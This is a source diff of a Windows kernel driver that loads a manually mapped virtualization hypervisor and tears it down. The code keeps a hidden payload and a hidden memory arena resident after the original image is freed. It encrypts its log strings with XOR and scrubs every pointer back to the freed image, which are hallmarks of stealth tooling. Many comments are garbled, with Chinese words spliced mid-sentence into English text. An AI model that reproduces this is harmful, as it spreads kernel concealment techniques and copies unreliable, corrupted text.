+        // image.  清除 the original 指针 too; if KEEP remains 设置,
         // DriverUnload returns before hv::stop(), leaving VT active.
         keep_clear_direct = mapdriver_direct_set_keep_hv_on_unload(false);
         req->keep_cleared = (keep_clear_hypercall || keep_clear_direct) ? 1 : 0;
-        LOG_DEBUG(_XOR_("[mapDriver] full_unload clear KEEP hypercall=%d direct=%d result=%llu\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload clear KEEP hypercall=%d direct=%d result=%llu\n"),
             (int)keep_clear_hypercall,
             (int)keep_clear_direct,
             req->keep_cleared);
@@ -3316,9 +3478,9 @@ static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
         mapdriver_read_u64_safe(req->boot_flags_ptr, &req->boot_flags_after);
 
     // Handoff only quarantines TestDriver and does not call DriverUnload.
-    // For a real teardown, clear KEEP through the hypercall above and allow
+    // For a real teardown, 清除 KEEP through the hypercall above and allow
     // the unload callback to run exactly once so TestDriver can call hv::stop()
-    // and free its VT runtime allocations before the mapped image is released.
+    // and 释放 its VT runtime allocations before the mapped image is released.
     bool self_stop_used = false;
 
     if (Utils::imageBase)
@@ -3328,7 +3490,7 @@ static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
             Utils::testDriverUnloaded = FALSE;
             // Always quarantine first. If hv::stop() fails closed, the TestDriver
             // image must remain mapped because some vCPU may still have HOST_RIP /
-            // root-mode references into it. Free it only after hv_ready is false.
+            // root-模式 references into it. 释放 it only after hv_ready is false.
             Utils::UnloadDriverEx(FALSE);
         }
         else
@@ -3341,11 +3503,11 @@ static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
     else if (detached_before && req->hv_before)
     {
         // One-key/freetest validation may have already released TestDriver.
-        // In that state there is no safe DriverUnload entry left to call; stop
-        // every vCPU through the payload VM-exit bridge itself, then free the
-        // adopted TestDriver pool blocks from the payload manifest.
+        // In that 状态 there is no safe DriverUnload 条目项 left to call; stop
+        // every vCPU through the payload VM-exit bridge itself, then 释放 the
+        // adopted TestDriver 内存池块s from the payload manifest.
         self_stop_used = mapdriver_stop_resident_hv_without_testdriver(req);
-        LOG_DEBUG(_XOR_("[mapDriver] full_unload payload self-stop result=0x%llX after=0x%llX ack=0x%llX exc=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload payload self-stop result=0x%llX after=0x%llX ack=0x%llX exc=0x%llX\n"),
             req->selfstop_result,
             req->selfstop_after,
             req->selfstop_ack,
@@ -3362,14 +3524,14 @@ static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
         req->test_after = (payload_u64)Utils::imageBase;
         req->payload_after = (payload_u64)Utils::payloadBase;
         req->result = (!req->hv_after) ? PAYLOAD_RESULT_OK : PAYLOAD_RESULT_INVALID_CONTEXT;
-        LOG_DEBUG(_XOR_("[mapDriver] full_unload stoptest leave result=0x%llX hv_after=%llu test=%p payload=%p\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload stoptest leave result=0x%llX hv_after=%llu test=%p payload=%p\n"),
             req->result, req->hv_after, Utils::imageBase, Utils::payloadBase);
         return;
     }
 
     if (detached_before && mapdriver_hv_ready())
     {
-        LOG_DEBUG(_XOR_("[mapDriver] full_unload aborted: hv still ready after TestDriver unload; skip hidden payload direct execution\n"));
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload aborted: hv still ready after VtHypervisor unload; skip hidden payload direct execution\n"));
         req->hv_after = 1;
         req->test_after = (payload_u64)Utils::imageBase;
         req->payload_after = (payload_u64)Utils::payloadBase;
@@ -3384,15 +3546,16 @@ static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
     if (detached_before && Utils::payloadBase)
     {
         // After resident handoff the WDM DriverUnload field is no longer a
-        // trusted teardown entry.  Stop through payload exports instead, then
-        // free the image/arena below.
+        // trusted teardown 条目项.  Stop through payload exports instead, then
+        // 释放 the image/arena below.
         Utils::payloadDriver.DriverUnload = nullptr;
-        LOG_DEBUG(_XOR_("[mapDriver] detached payload teardown uses stop export, DriverUnload suppressed\n"));
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] detached payload teardown uses stop export, DriverUnload suppressed\n"));
     }
 
     if (self_stop_used)
         mapdriver_free_resident_pool_blocks_for_unload(req);
 
+    _InterlockedExchange(&g_bootstrap_lightweight_unload_armed, 0);
     _InterlockedExchange(&g_payload_detached, 0);
     Utils::UnloadPayload();
     if (!mapdriver_hv_ready())
@@ -3407,12 +3570,25 @@ static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
         ? PAYLOAD_RESULT_OK
         : PAYLOAD_RESULT_INVALID_CONTEXT;
 
-    LOG_DEBUG(_XOR_("[mapDriver] full_unload leave result=0x%llX hv_after=%llu test=%p payload=%p delete_ctl=%llu\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload leave result=0x%llX hv_after=%llu test=%p payload=%p delete_ctl=%llu\n"),
         req->result, req->hv_after, Utils::imageBase, Utils::payloadBase, req->control_delete_queued);
 }
 
 EXTERN_C __declspec(dllexport) VOID unload_driver(PDRIVER_OBJECT DriverObject)
 {
+    // 驻留态轻量退出：保留常驻 HV、VtResidentPayload 与 Machenike，仅删除控制设备，
+    // 然后自然返回 UCXXRT/WDF 卸载包装器执行 __vcrt_uninitialize_locks / ExDeleteResourceLite
+    // 与 WDF unbind，彻底杜绝绕过 CRT 锁清理引发的 BugCheck 0xD4。
+    if ((g_bootstrap_lightweight_unload_armed != 0 || g_payload_detached != 0) &&
+        mapdriver_hv_ready())
+    {
+        mapdriver_delete_control_device();
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] unload_driver lightweight exit (preserving resident runtime) armed=%ld detached=%ld\n"),
+            g_bootstrap_lightweight_unload_armed,
+            g_payload_detached);
+        return;
+    }
+
     Utils::UnloadMachenike(DriverObject ? DriverObject : g_host_driver_object);
 
     mapctl_full_unload req = {};
@@ -3422,9 +3598,9 @@ EXTERN_C __declspec(dllexport) VOID unload_driver(PDRIVER_OBJECT DriverObject)
     req.flags = 0;
 
     // Real mapDriver unload must be a full teardown, not just "detach mapDriver".
-    // In one-key validation mode TestDriver may already be freed, so this path
+    // In one-key validation 模式 TestDriver may already be freed, so this path
     // also covers the payload-bridge self-stop flow used by MAPCTL_IOCTL_FULL_UNLOAD.
-    for (ULONG attempt = 0; attempt <= MAPDRIVER_UNLOAD_RETRY_COUNT; ++attempt)
+    for (ULONG attempt = 0; attempt <= VT_BOOT_UNLOAD_RETRY_COUNT; ++attempt)
     {
         RtlZeroMemory(&req, sizeof(req));
         req.magic = MAPCTL_FULL_UNLOAD_MAGIC;
@@ -3436,21 +3612,21 @@ EXTERN_C __declspec(dllexport) VOID unload_driver(PDRIVER_OBJECT DriverObject)
         if (req.result == PAYLOAD_RESULT_OK)
             break;
 
-        if (attempt == MAPDRIVER_UNLOAD_RETRY_COUNT)
+        if (attempt == VT_BOOT_UNLOAD_RETRY_COUNT)
             break;
 
-        LOG_DEBUG(_XOR_("[mapDriver] DriverUnload teardown retry %lu result=0x%llX hv=%llu test=0x%llX payload=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] DriverUnload teardown retry %lu result=0x%llX hv=%llu test=0x%llX payload=0x%llX\n"),
             attempt + 1,
             req.result,
             req.hv_after,
             req.test_after,
             req.payload_after);
-        mapdriver_wait_ms((LONG)MAPDRIVER_UNLOAD_RETRY_DELAY_MS);
+        mapdriver_wait_ms((LONG)VT_BOOT_UNLOAD_RETRY_DELAY_MS);
     }
 
     if (req.result != PAYLOAD_RESULT_OK)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] DriverUnload full teardown incomplete result=0x%llX hv_after=%llu test=0x%llX payload=0x%llX self=0x%llX ack=0x%llX exc=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] DriverUnload full teardown incomplete result=0x%llX hv_after=%llu test=0x%llX payload=0x%llX self=0x%llX ack=0x%llX exc=0x%llX\n"),
             req.result,
             req.hv_after,
             req.test_after,
@@ -3467,7 +3643,7 @@ EXTERN_C __declspec(dllexport) VOID unload_driver(PDRIVER_OBJECT DriverObject)
 
     mapdriver_delete_control_device();
 
-    LOG_DEBUG(_XOR_("[mapDriver] unload_driver leave result=0x%llX hv_after=%llu test=0x%llX payload=0x%llX\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] unload_driver leave result=0x%llX hv_after=%llu test=0x%llX payload=0x%llX\n"),
         req.result,
         req.hv_after,
         req.test_after,
@@ -3486,7 +3662,7 @@ static void mapdriver_fill_control_status(mapctl_status* out)
     // If the mapped TestDriver image is gone, report it as unloaded/quarantined
     // even if an older intermediate path left the boolean bookkeeping stale.
     // This keeps `payload_ctl status map` aligned with the actual lifecycle
-    // state: no image base/size means there is no TestDriver code to return to.
+    // 状态: no image base/大小尺寸 means there is no TestDriver code to return to.
     bool test_image_present = Utils::imageBase && Utils::imageSize;
     out->test_unloaded = (Utils::testDriverUnloaded || !test_image_present) ? 1 : 0;
     out->test_quarantined = (Utils::testDriverImageQuarantined || !test_image_present) ? 1 : 0;
@@ -3501,6 +3677,15 @@ static void mapdriver_fill_control_status(mapctl_status* out)
         out->payload_independent = out->payload.independent;
         out->payload_external_refs = out->payload.external_ref_flags;
         out->payload_barrier_ok = mapdriver_payload_barrier_ready(&out->payload) ? 1 : 0;
+        if (!Utils::machenikeLoaded && out->payload.payload_machenike_loaded && out->payload.payload_machenike_base)
+        {
+            Utils::machenikeBase = (PVOID)out->payload.payload_machenike_base;
+            Utils::machenikeSize = (ULONG)out->payload.payload_machenike_size;
+            Utils::machenikeMode = (ULONG)out->payload.payload_machenike_mode;
+            Utils::machenikeUsedIndependent = (BOOLEAN)out->payload.payload_machenike_used_indep;
+            Utils::machenikeUnload = (PDRIVER_UNLOAD)out->payload.payload_machenike_driver_unload;
+            Utils::machenikeLoaded = TRUE;
+        }
     }
     out->machenike_loaded = (Utils::machenikeLoaded && Utils::machenikeBase) ? 1 : 0;
     out->machenike_mode = (payload_u64)Utils::machenikeMode;
@@ -3834,8 +4019,8 @@ static void mapdriver_mmtest_control(mapctl_mmtest* req)
     if (req->flags & MAPCTL_MEMORY_AUDIT_OP_NOOP)
     {
         // Pure IOCTL smoke test: do not query payload status, do not issue
-        // resident VMCALLs, do not resolve target PA, and do not call any MM
-        // routine.  This distinguishes ctl/device routing from VT/MM paths.
+        // resident VMCALLs, do not resolve 目标 PA, and do not call any MM
+        // 例程.  This distinguishes ctl/device routing from VT/MM paths.
         req->result = PAYLOAD_RESULT_OK;
         return;
     }
@@ -4110,7 +4295,7 @@ static void mapdriver_mmtest_noop_control(mapctl_mmtest* req)
 
     if (use_arena_target && req->target_va && arena_test_size)
     {
-        // Raw direct read of the hidden arena.  If an explicit MmCopyMemory-VA
+        // Raw direct 读取 of the hidden arena.  If an explicit MmCopyMemory-VA
         // op is also requested, that op overwrites the same output fields below.
         if (!(flags & MAPCTL_MEMORY_AUDIT_OP_MMCM_VA))
         {
@@ -4658,14 +4843,14 @@ static void mapdriver_legacy_detach_control(mapctl_legacy_detach* req)
     }
 
     // Do not run the heavy legacy-data allocator/copy from the VM-exit
-    // root-mode VMCALL path.  legacy arm must be done before handoff while
-    // payload exports are still callable in normal kernel context; after
+    // root-模式 VMCALL path.  legacy arm must be done before handoff while
+    // payload exports are still callable in normal kernel 上下文; after
     // handoff this IOCTL only reports an already completed detach.
     if (g_payload_detached &&
         ((req->old_flags & PAYLOAD_LEGACY_DETACH_FLAG_COMPLETE) == 0))
     {
         req->stage = 2;
-        LOG_DEBUG(_XOR_("[mapDriver] legacy detach blocked after handoff: run legacy arm before handoff\n"));
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] legacy detach blocked after handoff: run legacy arm before handoff\n"));
         return;
     }
 
@@ -4715,7 +4900,7 @@ static void mapdriver_legacy_detach_control(mapctl_legacy_detach* req)
         if (!diag_ok)
         {
             req->stage = 4;
-            LOG_DEBUG(_XOR_("[mapDriver] legacy detach blocked: hv_diag not ready copied=0x%llX ver=%llu ghv=0x%llX ghv_size=0x%llX vt=0x%llX vt_bytes=0x%llX\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] legacy detach blocked: hv_diag not ready copied=0x%llX ver=%llu ghv=0x%llX ghv_size=0x%llX vt=0x%llX vt_bytes=0x%llX\n"),
                 req->diag_copied,
                 diag.version,
                 diag.ghv,
@@ -4729,7 +4914,7 @@ static void mapdriver_legacy_detach_control(mapctl_legacy_detach* req)
         if (set_result != PAYLOAD_RESULT_OK)
         {
             req->stage = 5;
-            LOG_DEBUG(_XOR_("[mapDriver] legacy detach blocked: set_hv_diag result=0x%llX\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] legacy detach blocked: set_hv_diag result=0x%llX\n"),
                 set_result);
             return;
         }
@@ -4755,8 +4940,8 @@ static void mapdriver_legacy_detach_control(mapctl_legacy_detach* req)
         req->shadow_count = after.legacy_shadow_count;
         RtlCopyMemory(&req->payload, &after, sizeof(after));
     }
-    // Keep stack pressure low: pool adoption may allocate/query memory-manager
-    // state, so callers run it after this large legacy-detach frame returns.
+    // Keep stack pressure low: pool adoption may 分配/query memory-manager
+    // 状态, so callers run it after this large legacy-detach frame returns.
 }
 
 enum mapdriver_freetest_scan_range : payload_u64
@@ -4867,12 +5052,12 @@ static bool mapdriver_freetest_slot_is_vtcallstack_scratch(payload_u64 range_id,
 
     // TestDriver::ghv_vtcallstack_list layout:
     //   spin_lock lock;                     // 4 bytes + align
-    //   ghv_vtcallstack_node buffer[32];
+    // ghv_vtcallstack_node 缓冲区[32];
     // ghv_vtcallstack_node layout:
     //   next(8), stack_ptr(8), stack[host_stack_size],
     //   cpu_number(4), pad(4), old_stack_ptr(8)
     //
-    // The inline stack[] buffers preserve old root-mode stack bytes.  They
+    // The inline stack[] buffers preserve old root-模式 stack bytes.  They
     // naturally contain return addresses into TestDriver code, but those are
     // stale stack snapshots, not live resident pointers.  Blocking freetest on
     // them produces false positives like ghv+0x1232188 -> TestDriver+0x5044D.
@@ -4920,7 +5105,7 @@ static void mapdriver_scan_freetest_range(mapctl_free_test* req,
     if (scan_end <= scan_base)
         return;
 
-    // These ranges should be resident payload-owned allocations.  Keep the
+    // These ranges should be 常驻 Payload-owned allocations.  Keep the
     // scan bounded so a corrupt diag cannot turn freetest into a long probe.
     if (scan_size > 0x4000000ull)
         return;
@@ -4949,7 +5134,7 @@ static void mapdriver_scan_freetest_range(mapctl_free_test* req,
     }
     __except (EXCEPTION_EXECUTE_HANDLER)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest scan fault range=%llu base=0x%llX size=0x%llX code=0x%X\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest scan fault range=%llu base=0x%llX size=0x%llX code=0x%X\n"),
             range_id, scan_base, scan_size, GetExceptionCode());
     }
 }
@@ -4973,7 +5158,7 @@ static void mapdriver_scan_freetest_status_copy(mapctl_free_test* req,
         test_size)
 
     // Scan fields with control-flow or mutable-legacy ownership semantics.  Do
-    // not scan diagnostic rings wholesale here: historical guest RIP samples can
+    // not scan diagnostic rings wholesale here: historical Guest RIP 指针 samples can
     // legitimately contain TestDriver addresses after the CRT wrapper has run,
     // but they are not live VMX-root call targets.  The strict runtime memory
     // scan below covers resident structures that can still be dereferenced.
@@ -5174,11 +5359,11 @@ static void mapdriver_install_payload_host_idt_for_freetest(mapctl_free_test* re
         __try
         {
             // HOST_IDT installation is only meaningful from VMX-root with a
-            // current VMCS.  Do not route this through mapdriver_set_payload_mode:
+            // 当前 VMCS.  Do not route this through mapdriver_set_payload_mode:
             // before unload_common() g_payload_detached is still false, so that
             // helper falls back to payload direct exports, and HOST_IDT has no
-            // direct-export equivalent.  After switchbridge the resident payload
-            // already owns VM-exit dispatch, so issue the hypercall explicitly.
+            // direct-export equivalent.  After switchbridge the 常驻 Payload
+            // already owns VM-exit 分发, so issue the hypercall explicitly.
             result = mapdriver_hv_ready()
                 ? hv::vmcall_set_payload_mode(
                     hv::payload_mode_host_idt,
@@ -5226,7 +5411,7 @@ static bool mapdriver_install_payload_host_idt_for_active_vcpus(const char* phas
         count = 64;
 
     mapdriver_install_payload_host_idt_for_freetest(&tmp, count);
-    LOG_DEBUG(_XOR_("[mapDriver] hostidt %s result=0x%llX done=%llu/%llu failed=%llu\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] hostidt %s result=0x%llX done=%llu/%llu failed=%llu\n"),
         phase ? phase : "install",
         tmp.hostidt_result,
         tmp.hostidt_ready,
@@ -5343,7 +5528,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
         ps.legacy_detach_result != PAYLOAD_RESULT_OK ||
         ((ps.legacy_detach_flags & PAYLOAD_LEGACY_DETACH_FLAG_COMPLETE) == 0))
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: legacy data not detached result=0x%llX flags=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: legacy data not detached result=0x%llX flags=0x%llX\n"),
             ps.legacy_detach_result,
             ps.legacy_detach_flags);
         return;
@@ -5365,7 +5550,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
     payload_u64 blocking_refs = req->scan_ghv_refs + req->scan_vth_refs;
     if (blocking_refs)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: live TestDriver refs=%llu ghv=%llu vt=%llu shadow=%llu first range=%llu addr=0x%llX off=0x%llX val=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: live VtHypervisor refs=%llu ghv=%llu vt=%llu shadow=%llu first range=%llu addr=0x%llX off=0x%llX val=0x%llX\n"),
             req->scan_refs,
             req->scan_ghv_refs,
             req->scan_vth_refs,
@@ -5377,14 +5562,14 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
         return;
     }
 
-    // Do not free TestDriver while any fallback path is still possible.
+    // Do not 释放 TestDriver while any fallback path is still possible.
     if (ps.vmexit_bridge_target != 0 ||
         ps.vmexit_bridge_forward_count != 0 ||
         ps.vmexit_bridge_forward_bad_key != 0 ||
         ps.vmexit_bridge_forward_unknown_code != 0 ||
         ps.vmexit_bridge_forward_non_vmcall != 0)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: target=0x%llX fwd=%llu bad=%llu unk=%llu non=%llu\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: target=0x%llX fwd=%llu bad=%llu unk=%llu non=%llu\n"),
             ps.vmexit_bridge_target,
             ps.vmexit_bridge_forward_count,
             ps.vmexit_bridge_forward_bad_key,
@@ -5419,7 +5604,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
         if (ack != count)
         {
             req->failed_index = ack < count ? ack : 0;
-            LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: AMD resident ack=%llu/%llu\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: AMD resident ack=%llu/%llu\n"),
                 ack, count);
             return;
         }
@@ -5450,7 +5635,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
             diag.vmcs_host_rsp >= (ps.host_stack_base + ps.host_stack_size))
         {
             req->failed_index = i;
-            LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: vcpu=%llu ok=%d rip=0x%llX bridge=0x%llX rsp=0x%llX stack=0x%llX/0x%llX\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: vcpu=%llu ok=%d rip=0x%llX bridge=0x%llX rsp=0x%llX stack=0x%llX/0x%llX\n"),
                 i, (int)ok, diag.vmcs_host_rip, ps.vmexit_bridge,
                 diag.vmcs_host_rsp, ps.host_stack_base, ps.host_stack_size);
             return;
@@ -5465,7 +5650,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
         if (req->hostidt_result != PAYLOAD_RESULT_OK ||
             req->hostidt_ready != req->hostidt_requested)
         {
-            LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: host idt install result=0x%llX done=%llu/%llu failed=%llu\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: host idt install result=0x%llX done=%llu/%llu failed=%llu\n"),
                 req->hostidt_result,
                 req->hostidt_ready,
                 req->hostidt_requested,
@@ -5481,9 +5666,9 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
         req->hostidt_result = PAYLOAD_RESULT_OK;
     }
 
-    // After this point the old TestDriver image may be released.  Remove every
-    // restore/fallback breadcrumb that can point a later control path back into
-    // that image: payload trampoline target, saved bridge target, cached diag
+    // After this point the old TestDriver image may be released.  卸载移除 every
+    // 恢复/fallback breadcrumb that can point a later control path back into
+    // that image: payload trampoline 目标, saved bridge 目标, cached diag
     // handler/image fields, KEEP shadow, and per-vCPU old_rip descriptors.
     mapdriver_scrub_payload_host_desc_for_freetest(
         ps,
@@ -5494,7 +5679,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
         mapdriver_set_payload_mode(hv::payload_mode_cutover, PAYLOAD_CUTOVER_MODE_RELEASE);
     if (req->cutover_restore_result != PAYLOAD_RESULT_OK)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: release finalizer failed result=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: release finalizer failed result=0x%llX\n"),
             req->cutover_restore_result);
         return;
     }
@@ -5507,7 +5692,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
     payload_status ps_after_release = {};
     if (!mapdriver_query_payload_status(&ps_after_release))
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: payload status unavailable after release finalizer\n"));
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: payload status unavailable after release finalizer\n"));
         return;
     }
     mapdriver_reset_freetest_scan(req);
@@ -5515,7 +5700,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
     blocking_refs = req->scan_ghv_refs + req->scan_vth_refs + req->scan_shadow_refs;
     if (blocking_refs)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked after release finalizer: refs=%llu ghv=%llu vt=%llu shadow=%llu first range=%llu addr=0x%llX off=0x%llX val=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked after release finalizer: refs=%llu ghv=%llu vt=%llu shadow=%llu first range=%llu addr=0x%llX off=0x%llX val=0x%llX\n"),
             req->scan_refs,
             req->scan_ghv_refs,
             req->scan_vth_refs,
@@ -5527,13 +5712,13 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
         return;
     }
 
-    LOG_DEBUG(_XOR_("[mapDriver] freetest release prep TestDriver image base=%p size=0x%X vcpus=%llu\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest release prep VtHypervisor image base=%p size=0x%X vcpus=%llu\n"),
         Utils::imageBase, Utils::imageSize, req->vcpu_ready);
     req->free_phase = 1;
-    // Do NOT restore the old TestDriver handle_vm_exit target around the final
-    // free.  Once MmFreeIndependentPages releases the image pages, even a tiny
+    // Do NOT 恢复 the old TestDriver handle_vm_exit 目标 around the final
+    // 释放.  Once MmFreeIndependentPages releases the image pages, even a tiny
     // window with bridge_target still pointing at TestDriver can send a late
-    // VM-exit into freed code.  The resident no-target path must handle the
+    // VM-exit into freed code.  The resident no-目标 path must 处理 the
     // release window by itself.
     req->free_phase = 2;
 
@@ -5541,9 +5726,9 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
     // DriverUnload wrapper exactly once while KEEP_HV_ON_UNLOAD is forced.
     // The user's Driver_Unload returns early, so resident VT keeps running,
     // but the MSVC/UCXXRT wrapper still tears down CRT globals such as the
-    // per-driver lookaside/PTD list.  If we skip this and free the image, the
+    // per-driver lookaside/PTD list.  If we skip this and 释放 the image, the
     // kernel's periodic ExpScanGeneralLookasideList later walks a stale list
-    // entry inside the freed TestDriver image and bugchecks.
+    // 条目项 inside the freed TestDriver image and bugchecks.
     req->crt_keep_result = PAYLOAD_RESULT_INVALID_CONTEXT;
     __try
     {
@@ -5561,7 +5746,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
 
     if (req->crt_keep_result != PAYLOAD_RESULT_OK)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: failed to force KEEP_HV before CRT unload result=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: failed to force KEEP_HV before CRT unload result=0x%llX\n"),
             req->crt_keep_result);
         return;
     }
@@ -5574,7 +5759,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
     req->crt_unload_called = Utils::testDriverUnloadCallbackCalled ? 1 : 0;
     if (!req->crt_unload_called)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: TestDriver DriverUnload wrapper did not complete\n"));
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: VtHypervisor DriverUnload wrapper did not complete\n"));
         return;
     }
     g_testdriver_boot_flags_ptr = 0;
@@ -5584,7 +5769,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
         mapdriver_set_payload_mode(hv::payload_mode_cutover, PAYLOAD_CUTOVER_MODE_RELEASE);
     if (req->cutover_restore_result != PAYLOAD_RESULT_OK)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: release finalizer after CRT failed result=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: release finalizer after CRT failed result=0x%llX\n"),
             req->cutover_restore_result);
         return;
     }
@@ -5594,7 +5779,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
         !mapdriver_payload_barrier_ready(&ps_before_free) ||
         !ps_before_free.vmexit_bridge)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: payload status unavailable before final free\n"));
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: payload status unavailable before final free\n"));
         return;
     }
 
@@ -5604,14 +5789,14 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
         auto copied = mapdriver_get_resident_hv_diag(&diag_before_free);
         if (!mapdriver_hv_diag_valid(diag_before_free, copied) || !diag_before_free.vcpu_count)
         {
-            LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: hv diag unavailable before final free copied=%llu\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: hv diag unavailable before final free copied=%llu\n"),
                 copied);
             return;
         }
     }
     __except (EXCEPTION_EXECUTE_HANDLER)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked: hv diag exception before final free code=0x%X\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked: hv diag exception before final free code=0x%X\n"),
             GetExceptionCode());
         return;
     }
@@ -5651,7 +5836,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
 
     if (req->scan_refs)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest blocked before final free: refs=%llu ghv=%llu vt=%llu shadow=%llu first range=%llu addr=0x%llX off=0x%llX val=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest blocked before final free: refs=%llu ghv=%llu vt=%llu shadow=%llu first range=%llu addr=0x%llX off=0x%llX val=0x%llX\n"),
             req->scan_refs,
             req->scan_ghv_refs,
             req->scan_vth_refs,
@@ -5664,7 +5849,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
     }
 
     req->free_phase = 3;
-    LOG_DEBUG(_XOR_("[mapDriver] freetest freeing TestDriver image base=%p size=0x%X vcpus=%llu\n"),
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest freeing VtHypervisor image base=%p size=0x%X vcpus=%llu\n"),
         Utils::imageBase, Utils::imageSize, req->vcpu_ready);
     Utils::UnloadDriverEx(TRUE);
     req->free_phase = 4;
@@ -5672,7 +5857,7 @@ static void mapdriver_free_test_image_control(mapctl_free_test* req)
         mapdriver_set_payload_mode(hv::payload_mode_cutover, PAYLOAD_CUTOVER_MODE_CLEAR);
     if (req->cutover_clear_result != PAYLOAD_RESULT_OK)
     {
-        LOG_DEBUG(_XOR_("[mapDriver] freetest warning: cutover clear after free result=0x%llX\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] freetest warning: cutover clear after free result=0x%llX\n"),
             req->cutover_clear_result);
     }
 
@@ -5784,7 +5969,7 @@ static void mapdriver_switch_host_rsp(mapctl_host_rsp_switch* req)
         // Preserve the original pre-payload HOST_RSP across repeated switch
         // attempts.  If switchrsp is executed a second time, old_rsp may be the
         // payload stack (or a transient vtcall stack), and overwriting it would
-        // make a real restore impossible.
+        // make a real 恢复 impossible.
         if (!already_switched)
             desc[i].old_rsp = old_rsp;
         desc[i].last_rsp = new_rsp;
@@ -6172,7 +6357,7 @@ static void mapdriver_restore_host_rip(mapctl_host_rip_switch* req)
         : PAYLOAD_RESULT_INVALID_CONTEXT;
 }
 
-#if MAPDRIVER_AUTO_ONEKEY_LOAD
+#if VT_BOOT_AUTO_ONEKEY_LOAD
 typedef VOID(*mapdriver_expand_stack_callout_fn)(PVOID Parameter);
 extern "C" NTKERNELAPI NTSTATUS KeExpandKernelStackAndCallout(
     mapdriver_expand_stack_callout_fn Callout,
@@ -6216,7 +6401,7 @@ static bool mapdriver_onekey_wait_payload_barrier(ULONG timeout_ms,
         {
             if (last)
                 RtlCopyMemory(last, &ps, sizeof(ps));
-            LOG_DEBUG(_XOR_("[mapDriver] onekey payload barrier ready elapsed=%lu pmo_draw=%llu biz=%llu\n"),
